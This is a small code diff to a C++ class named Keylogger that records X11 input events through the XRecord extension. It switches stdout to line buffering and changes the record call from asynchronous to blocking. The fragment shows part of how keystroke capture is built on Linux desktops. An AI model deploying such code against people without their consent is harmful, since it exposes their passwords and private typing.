@@ -14,6 +14,7 @@
 
 Keylogger::Keylogger()
 {
+  setvbuf(stdout, NULL, _IOLBF, 1024);
 }
 
 Keylogger::~Keylogger()
@@ -23,7 +24,7 @@ Keylogger::~Keylogger()
 
 void		Keylogger::start()
 {
-  if (!XRecordEnableContextAsync(userData.dataDisplay, recContext, eventCallback, (XPointer) &userData))
+  if (!XRecordEnableContext(userData.dataDisplay, recContext, eventCallback, (XPointer) &userData))
     throw std::exception();
 }
 
